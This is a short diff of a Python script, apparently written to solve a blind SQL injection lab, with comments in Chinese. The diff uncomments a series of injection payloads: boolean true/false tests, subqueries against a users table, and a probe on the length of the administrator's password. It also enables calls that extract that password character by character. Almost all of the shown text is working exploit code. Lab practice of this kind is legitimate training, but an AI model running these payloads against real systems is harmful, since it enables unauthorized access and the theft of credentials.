@@ -42,12 +42,12 @@ def find_pw(pw_len:int)->str:
     return pw
 
 def main():
-    # #官方測試==============
-    # payload="JPu7FKUc6cC67KOP' AND '1'='1"
-    # is_find_welcome(payload)
+    #官方測試==============
+    payload="JPu7FKUc6cC67KOP' AND '1'='1"
+    is_find_welcome(payload)
 
-    # payload="JPu7FKUc6cC67KOP' AND '1'='2"
-    # is_find_welcome(payload)
+    payload="JPu7FKUc6cC67KOP' AND '1'='2"
+    is_find_welcome(payload)
 
     #我自己嘗試測試=========
     payload="' or '1'='1"
@@ -56,19 +56,19 @@ def main():
     payload="' or '1'='2"
     is_find_welcome(payload)
 
-#    payload="' or (select 'a' from users limit 1 )= 'a"
-#    is_find_welcome(payload)
+    payload="' or (select 'a' from users limit 1 )= 'a"
+    is_find_welcome(payload)
 
-#    payload="' or (select 'a' from users where username = 'administrator' )= 'a"
-#    is_find_welcome(payload)
+    payload="' or (select 'a' from users where username = 'administrator' )= 'a"
+    is_find_welcome(payload)
 
-    # payload="' or (select 'a' from users where username = 'administrator' AND LENGTH(password)>1)= 'a"
-    # is_find_welcome(payload)
+    payload="' or (select 'a' from users where username = 'administrator' AND LENGTH(password)>1)= 'a"
+    is_find_welcome(payload)
 
-    # pw_len = find_pw_len()
-    # print(f"pw_len:{pw_len}")
+    pw_len = find_pw_len()
+    print(f"pw_len:{pw_len}")
 
-    # print(find_pw(20))
+    print(find_pw(20))
 
 
 
